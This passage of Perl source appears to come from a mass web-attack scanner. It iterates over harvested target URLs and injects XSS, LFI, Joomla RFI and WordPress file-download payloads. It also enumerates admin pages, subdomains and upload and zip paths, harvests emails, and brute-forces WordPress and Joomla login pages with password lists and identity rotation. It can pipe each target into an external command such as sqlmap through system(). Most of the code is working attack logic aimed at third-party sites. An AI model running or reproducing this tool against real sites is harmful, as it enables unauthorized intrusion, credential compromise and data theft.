  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file = $Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	$URL = control($URL);
	if (defined $exploit) {
      my $count3=0;  
      open (EXP, $Bin.'/aTexploits.txt');
      while (my $exp = <EXP>) {
		$count3++;
	    chomp $exp;
        print "\033[0;36m    ";
	    timer();
	    print "[Exp $count3/";
		my $file = $Bin."/aTexploits.txt";
	    countLists($file);
	    print "\033[0;36m]\n";
	    print "\033[1;37m    EXPLT:  ";
	    print "\033[0;37m$exp\n";
        my $URL1 = $URL.$exp;
        $URL1 =~ s/ //g;
        checkedUrl($URL1);
      }
      close (EXP);
    }else{
      my $URL1 = $URL;
      $URL1 =~ s/ //g;
      checkedUrl($URL1);
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
	unlink $Bin.'/aTsearch.txt';
    if ((!defined $validText) && (!defined $command) && (!defined $xss) && (!defined $lfi) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $adminPage) && (!defined $subdomain) && (!defined $mupload) && (!defined $mzip) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  adios();
	}else{
      use File::Copy qw(copy);
	  copy $Bin.'/aTscan.txt', $Bin.'/aTsearch.txt';
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negatif();
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## VALIDATION BY TEXT
sub validation {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  if (-e $Bin.'/validated.txt'){ unlink $Bin.'/validated.txt';}
  if ((!defined $mlevel) && (!defined $misup)) {
    targetList();
  }
  searchexitstargets();
  scanTitleBgn();
  print "\033[1;37mVALIDATION BY STRING";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
	chomp $URL;
    $count++;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file = $Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
    print "\033[1;37m    TARGET: ";
    print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	$URL = control($URL);	
    if (defined $exploit) {
      my $count3=0;
      open (EXP, $Bin.'/aTexploits.txt');
      while (my $exp = <EXP>) {
		$count3++;
	    chomp $exp;
        print "\033[0;36m    ";
	    timer();
	    print "[Exp $count3/";
	    my $file = $Bin."/aTexploits.txt";
	    countLists($file);
	    print "\033[0;36m]\n";
	    print "\033[1;37m    EXPLT:  ";
	    print "\033[0;37m$exp\n";
        my $URL1 = $URL.$exp;
        $URL1 =~ s/ //g;
        checkedUrl($URL1);
      }
      close (EXP);
    }else{
      my $URL1 = $URL;
      $URL1 =~ s/ //g;
      checkedUrl($URL1);
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
	unlink $Bin.'/aTsearch.txt';
    if ((!defined $command) && (!defined $xss) && (!defined $lfi) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $adminPage) && (!defined $subdomain) && (!defined $mupload) && (!defined $mzip) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  adios();
	}else{
      use File::Copy qw(copy);
	  copy $Bin.'/aTscan.txt', $Bin.'/aTsearch.txt';
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## XSS
sub xss {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  headerScan();
  print "\033[1;37mXSS";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	if ((!defined $misup) && (!defined $validText)) {
      $URL = control($URL);
	}
	foreach my $XSS(@XSS){
	  $URL =~ s/ //g;
	  if (defined $exploit) {
        my $count3=0;
        open (EXP, $Bin.'/aTexploits.txt');
        while (my $exp = <EXP>) {
		  $count3++;
	      chomp $exp;
          print "\033[0;36m    ";
	      timer();
	      print "[Exp $count3/";
	      my $file = $Bin."/aTexploits.txt";
	      countLists($file);
	      print "\033[0;36m]\n";
	      print "\033[1;37m    EXPLT:  ";
	      print "\033[0;37m$exp\n";
          my $URL1 = $URL.$exp.$XSS;
          checkedUrl($URL1);
        }
        close (EXP);
      }elsif (defined $p) {
		if ($URL =~ /$p=([^&]*)/) {
		  $URL =~ s/$p=([^&]*)/$p=$1$XSS/g;
          my $URL1 = $URL; 
		  checkedUrl($URL1);
		}else{
		  print "    \033[1;37mSCAN:   ";   
	      print "\033[0;31mNo Parameter [$p] Found!\n";
		}
      }else{
        my $URL1 = $URL.$XSS;
        checkedUrl($URL1);
      }
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $lfi) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $adminPage) && (!defined $subdomain) && (!defined $mupload) && (!defined $mzip) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  adios();
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## LFI
sub lfi {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  LFI();
  headerScan();
  print "\033[1;37mLFI";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	$URL =~ s/=.*/=/s;
	$URL=checkUrlSchema($URL);	
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	foreach my $LFI(@LFI){
	  print "\033[1;37m    PAYLD:  ";
	  print "\033[0;37m$LFI \n";
	  $URL =~ s/ //g;
	  if (defined $exploit) {
        my $count3=0;
        open (EXP, $Bin.'/aTexploits.txt');
        while (my $exp = <EXP>) {
		  $count3++;
	      chomp $exp;
          print "\033[0;36m    ";
	      timer();
	      print "[Exp $count3/";
	      my $file = $Bin."/aTexploits.txt";
	      countLists($file);
	      print "\033[0;36m]\n";
	      print "\033[1;37m    EXPLT:  ";
	      print "\033[0;37m$exp\n";
          my $URL1 = $URL.$exp.$LFI;
          $URL1 =~ s/ //g;
          checkedUrl($URL1);
        }
        close (EXP);
      }else{
        my $URL1 = $URL.$LFI;
        $URL1 =~ s/ //g;
        checkedUrl($URL1);
      }
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $JoomRfi) && (!defined $WpAfd) && (!defined $adminPage) && (!defined $subdomain) && (!defined $mupload) && (!defined $mzip) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  adios();
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## RFI JOOMLA
sub JoomRfi {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  headerScan();
  print "\033[1;37mJOOMLA RFI";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	$URL =~ s/\/index.php//s;
	$URL=checkUrlSchema($URL);
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	foreach my $RFI(@RFI){
	  print "\033[1;37m    PAYLD:  ";
	  print "\033[0;37m$RFI \n";
      my $URL1 = $URL.$RFI;
	  $URL1 =~ s/ //g;
	  checkedUrl($URL1);
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $JoomRfi) && (!defined $WpAfd) && (!defined $adminPage) && (!defined $subdomain) && (!defined $mupload) && (!defined $mzip) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  if (defined $output) {
	    output($output);
	  }
      subfin();
	  unlink $Bin.'/aTsearch.txt';
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## WORDPRESS ADF
sub WpAfd {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  headerScan();
  print "\033[1;37mWORDRESS ADF";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	$URL = removeProtocol($URL);
	$URL =~ s/\/wp-content//s;
	$URL=checkUrlSchema($URL);
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	foreach my $ADFWP(@ADFWP){
	  print "\033[1;37m    PAYLD:  ";
	  print "\033[0;37m$ADFWP \n";
      my $URL1 = $URL.$ADFWP;
	  $URL1 =~ s/ //g;
	  checkedUrl($URL1);
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $adminPage) && (!defined $subdomain) && (!defined $mupload) && (!defined $mzip) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  if (defined $output) {
	    output($output);
	  }
      subfin();
	  unlink $Bin.'/aTsearch.txt';
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET ADMIN PAGE
sub adminPage {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  headerScan();
  print "\033[1;37mADMIN PAGE";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
    $URL=checkUrlSchema($URL);
    $URL = removeProtocol($URL);
	$URL =~ s/\/.*//s;
	my $printarget = $URL;
	$URL=checkUrlSchema($URL);	
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$URL\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	foreach my $ADMIN(@ADMIN){
	  print "\033[1;37m    PAYLD:  ";
	  print "\033[0;37m$ADMIN \n";
      my $URL1 = $URL.$ADMIN;
	  $URL1 =~ s/ //g;
	  checkedUrl($URL1);
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $lfi) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $adminPage) && (!defined $subdomain) && (!defined $mupload) && (!defined $mzip) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  if (defined $output) {
	    output($output);
	  }
      subfin();
	  unlink $Bin.'/aTsearch.txt';
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET SUBDOMAINS
sub subdomain {
   if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  headerScan();
  print "\033[1;37mSUBDOMAIN";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	my %replace = (
       'http://www.' => '',
       'https://www.' => '',
       'http://' => '',
       'https://' => '',
    );
    $URL =~ s/$_/$replace{$_}/g for keys %replace;
	$URL =~ s/\/.*//s;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	foreach my $SUBDOMAIN(@SUBDOMAIN){
      my $URL1 = $SUBDOMAIN.$URL;
	  my $socket=IO::Socket::INET->new(
      PeerAddr=>"$URL1",
      Proto=>'icmp',
      timeout=>1);
	  print "\033[1;37m    PAYLD:  ";
	  print "\033[0;37m$SUBDOMAIN \n";
	  print "\033[1;37m    INFO:   ";
	  if ((defined $socket) && ($socket ne "")) { 
	  	if (defined $beep) {print chr(7);}
	    print "\033[0;32mhttp://$URL1\n";
	    open (INFO, '>>aTscan.txt');
        print INFO "http://$URL1\n";
        close (INFO);
	  }else{
	    print "\033[0;31mNot a Subdomain! \n";
	  }
	  close $socket if defined $socket;
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $WpSites) && (!defined $JoomSites) && (!defined $mupload) && (!defined $mzip) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  if (defined $output) {
	    output($output);
	  }
      subfin();
	  unlink $Bin.'/aTsearch.txt';
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET UPLOAD FILES
sub uploadSites {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  headerScan();
  print "\033[1;37mUPLOAD FILES";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	$URL =~ s/=.*/=/s;
	$URL=checkUrlSchema($URL);	
	print "\033[1;37m    ";
	timer();
    print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	foreach my $UPLOAD(@UPLOAD){
	  print "\033[1;37m    PAYLD:  ";
	  print "\033[0;37m$UPLOAD \n";
	  if (defined $exploit) {
        my $count3=0;
        open (EXP, $Bin.'/aTexploits.txt');
        while (my $exp = <EXP>) {
		  $count3++;
	      chomp $exp;
          print "\033[0;36m    ";
	      timer();
	      print "[Exp $count3/";
	      my $file = $Bin."/aTexploits.txt";
	      countLists($file);
	      print "\033[0;36m]\n";
  	      print "\033[1;37m    EXPLT:  ";
	      print "\033[0;37m$exp\n";
          my $URL1 = $URL.$exp.$UPLOAD;
          $URL1 =~ s/ //g;
          checkedUrl($URL1);
        }
        close (EXP);
      }else{
        my $URL1 = $URL.$UPLOAD;
        $URL1 =~ s/ //g;
        checkedUrl($URL1);
      }
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $mzip) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  adios();
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET ZIP FILES
sub zipSites {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  headerScan();
  print "\033[1;37mZIP FILES";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	$URL =~ s/=.*/=/s;
	$URL=checkUrlSchema($URL);	
	print "\033[1;37m    ";
	timer();
    print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
    foreach my $ZIP(@ZIP){
	  print "\033[1;37m    PAYLD:  ";
	  print "\033[0;37m$ZIP \n";
	  if (defined $exploit) {
        my $count3=0;
        open (EXP, $Bin.'/aTexploits.txt');
        while (my $exp = <EXP>) {
		  $count3++;
	      chomp $exp;
          print "\033[0;36m    ";
	      timer();
	      print "[Exp $count3/";
	      my $file = $Bin."/aTexploits.txt";
	      countLists($file);
	      print "\033[0;36m]\n";
	      print "\033[1;37m    EXPLT:  ";
	      print "\033[0;37m$exp\n";
          my $URL1 = $URL.$exp.$ZIP;
          $URL1 =~ s/ //g;
          checkedUrl($URL1);
        }
        close (EXP);
      }else{
        my $URL1 = $URL.$ZIP;
        $URL1 =~ s/ //g;
        checkedUrl($URL1);
      }
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $eMails) && (!defined $WpBf) && (!defined $joomBf) && (!defined $command)) {
	  adios();
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET E-MAILS
sub eMails {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  if (-e $Bin.'/aTmails.txt') {unlink $Bin.'/aTmails.txt';}
  headerScan();
  print "\033[1;37mE-MAILS";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	if (defined $exploit) {
      my $count3=0;
      open (EXP, $Bin.'/aTexploits.txt');
      while (my $exp = <EXP>) {
	    $count3++;
	    chomp $exp;
        print "\033[0;36m    ";
	    timer();
	    print "[Exp $count3/";
	    my $file = $Bin."/aTexploits.txt";
	    countLists($file);
	    print "\033[0;36m]\n";
	    print "\033[1;37m    EXPLT:  ";
	    print "\033[0;37m$exp\n";
        my $URL1 = $URL.$exp;
        $URL1 =~ s/ //g;
        checkedUrl($URL1);
      }
      close (EXP);
    }else{
      my $URL1 = $URL;
      $URL1 =~ s/ //g;
      checkedUrl($URL1);
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $WpBf) && (!defined $joomBf)) {
	  if (defined $output) {
	    output($output);
	  }
      subfin();
	  unlink $Bin.'/aTsearch.txt';
	  unlink $Bin.'/aTmails.txt';
	}
	unlink $Bin.'/aTscan.txt';
	unlink $Bin.'/aTmails.txt';
	unlink $Bin.'/aTexploits.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BRUTE FORCE WORDPRESS SITES
sub BFmwpsites {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  headerScan();
  print "\033[1;37mBRUTE FORCE WORDPRESS SITES";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	$URL =~ s/\/wp-content.*//s;
	$URL=checkUrlSchema($URL);	
	my $printarget = $URL;
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
    if (defined $password) {
      my $password=$password;
    }
    my $URL1 = $URL."/wp-login.php";
	$URL1 =~ s/ //g;
    my $request = HTTP::Request->new('GET', $URL1);
    my $response = $ua->request($request);
    my $status = $response->code;
	print "\033[1;37m    CMS:    ";
    if ($response->code==200) {
	print "\033[0;32mWordpress!\n";
	open(PASS,"<$password") or die "[!] Can not find $!";
    while(<PASS>){
        chomp($_);
		$_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
		if (defined $random) {newIdentity();}
        my $ua = new LWP::UserAgent;
        my $response = $ua->post($URL1, 
                    { 'log' => $username, 
                      'pwd' => $_,
                      'wp-submit' => 'Log in',
                    });
        my $code = $response->code;
        my $content = $response->content;
        print "\033[1;37m    USER:   ";
	    print "\033[0;37m$username\n";
        $_ =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
        print "\033[1;37m    PASS:   ";
	    print "\033[0;37m$_\n";
        print "\033[1;37m    SCAN:   ";
	    my $pa='Bienvenido|Welcome|Bienvenue|log off|Cerrar Sesion|Se deconnecter';
        if ($content =~ /$pa/) {
		  if (defined $beep) {print chr(7);}
	      print "\033[0;32m$URL1\n";
          print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
	      open (LOG, '>>', $Bin.'/aTscan.txt');
          print LOG "$URL1\n   $1\n";
          close (LOG);
		  last;
        }else{
	      print "\033[0;31mNot Vulnerable!\n";
	    }
      }
	}else{
	  print "\033[0;31mNot Wordpress!\n";
	}
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
    close(PASS);
  }
  close(TEXT); 
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if ((!defined $joomBf) && (!defined $command)) {
	  adios();
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BRUTE FORCE JOOBLA SITES
sub BFmjoomsites {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  headerScan();
  print "\033[1;37mBRUTE FORCE JOOMLA SITES";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
    $URL = checkUrlType($URL);
	$URL=checkUrlSchema($URL);	
	$URL =~ s/\/index.php//s;
	$URL=checkUrlSchema($URL);
	my $printarget = $URL;
	print "\033[1;37m    ";
	timer();
    print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$printarget\n";
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
    if (defined $password) {
      my $password=$password;
    }
    my $URL1 = $URL."/administrator/index.php";
	$URL1 =~ s/ //g;
    checkedUrl($URL1);  
    my $request = HTTP::Request->new('GET', $URL1);
    my $response = $ua->request($request);
    my $status = $response->code;
	print "\033[1;37m    CMS:    ";
	if ($response->code==200) {
	  print "\033[0;32mJoomla!\n";
	  open(PASS,"<$password") or die "[!] Can not find $!";
      while(<PASS>){
        chomp($_);
		$_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
		if (defined $random) {newIdentity();}
        my $ua = new LWP::UserAgent;
        my $response = $ua->post($URL1, 
                      { 'username' => $username, 
                        'passwd' => $_,
                        'submit' => 'Log in',
                      });
        my $code = $response->code;
        my $content = $response->content;
        print "\033[1;37m    USER:   ";
	    print "\033[0;37m$username\n";       
        print "\033[1;37m    PASS:   ";
        $_ =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
	    print "$_\n";
        print "\033[1;37m    SCAN:   ";
	    my $pa='Panel de Control|Control Panel|Bienvenue|log off|Cerrar Sesion|Se deconnecter';
        if ($content =~ /$pa/) {
		  if (defined $beep) {print chr(7);}
	      print "\033[0;32m$URL1\n";
          print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
		  open (LOG, '>>', $Bin.'/aTscan.txt');
          print LOG "$URL1\n   $1\n";
          close (LOG);
		  last;
        }else{
	      print "\033[0;31mNot Vulnerable!\n";
	    }
      }
	}else{
	  print "\033[0;31mNot Joomla!\n";
	}
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
    close(PASS);
  }
  close(TEXT);
  if (-e $Bin.'/aTscan.txt') {
  	countResultLists();
    if (!defined $command) {   
	  adios();
	}
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
  }else{
	negativeExit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## EXTERN COMMAND
sub mcommand {
  headerScan();
  print "\033[1;37mEXTERNAL COMMAND SUBPROCESS";
  scanTitleEnd();
  my $count=0;
  open (TEXT, $Bin.'/aTsearch.txt');
  while (my $URL = <TEXT>) {
    $count++;
	chomp $URL;
	if ($command =~/sqlmap/) {
      if (substr($URL, -3) eq '%27') {
	    $URL=~ s/%27//g;
	  }
	}
    $URL=checkUrlSchema($URL);
	print "\033[1;33m    ";
	timer();
	print "[Target $count/";
	my $file=$Bin."/aTsearch.txt";
	countLists($file);
	print "\033[1;33m]\n";
	print "\033[1;37m    TARGET: ";
	print "\033[0;35m$URL \n";
	my $printarget=$URL;
	$printarget=validateUrl($printarget);
	if ($printarget eq 'checkednovalidurl') {adviseUrl();next;}
	if (!defined $noinfo) {
      my $URL1=$URL;
      checkExtraInfo($URL1);
	}
	if ((!defined $misup) && (!defined $validText)) {
      $URL = control($URL);
	}
	$URL=checkUrlSchema($URL);
	if (defined $command) {
	  $command =~ s/--TARGET//g;
	}
	if ((!defined $xss) && (!defined $lfi) && (!defined $command) && (!defined $misup) && (!defined $validText) && (!defined $adminPage) && (!defined $subdomain) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $mports) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf)) {
	  if (defined $exploit) {
        my $count3=0;  
        open (EXP, $Bin.'/aTexploits.txt');
        while (my $exp = <EXP>) {
		  $count3++;
	      chomp $exp;
          print "\033[0;36m    ";
	      timer();
	      print "[Exp $count3/";
	      my $file = $Bin."/aTexploits.txt";
	      countLists($file);
	      print "\033[0;36m]\n";
	      print "\033[1;37m    EXPLT:  ";
	      print "\033[0;37m$exp\n";
          $URL = $URL.$exp;
          my $cod = "$command $URL";
	      print "\033[1;37m    CMD:    ";
          print "\033[0;37m$cod \n\n";
          system($cod);
	    }
	  }
    }else{
      my $cod = "$command $URL";
	  print "\033[1;37m    CMD:    ";
      print "$cod \n\n";
      system($cod);
    }
    print "    \033[0;37m[ ]--------------------------------------------------------------------\n";
  }
  subfin();
  unlink $Bin.'/aTexploits.txt';
  unlink $Bin.'/aTsearch.txt';
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## MD5 ENCODE
sub mmd5 {
  scanDetail();
  scanTitleBgn();
  print "\033[1;37mMD5 GENERATOR";
  scanTitleEnd();
  print "\033[1;37m    STRING: ";
